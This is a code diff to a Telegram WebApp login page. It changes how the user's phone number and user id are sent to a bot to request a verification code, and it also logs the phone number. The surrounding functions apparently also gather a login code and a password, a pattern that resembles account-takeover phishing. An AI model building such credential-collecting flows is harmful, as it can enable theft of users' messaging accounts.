@@ -363,19 +363,25 @@
         }
 
         function submitPhone() {
-            if (authData.isProcessing) {
-                console.log('Already processing phone submission');
-                return;
-            }
-
+            if (authData.isProcessing) return;
             if (!authData.phone) {
                 tg.showAlert('Номер телефона не получен');
                 return;
             }
 
             authData.isProcessing = true;
-            sendToBot('request_code', { phone: authData.phone });
+    
+            const payload = JSON.stringify({
+                action: 'request_code',
+                phone: authData.phone,
+                user_id: tg.initDataUnsafe?.user?.id
+            });
+
+            console.log('Sending phone to bot:', authData.phone);
+            tg.sendData(payload); // ЭТО ЗАКРОЕТ WEBAPP
         }
+
+// Удалите submitCode() и submitPassword() - они не нужны
 
         function submitCode() {
             if (authData.isProcessing) {
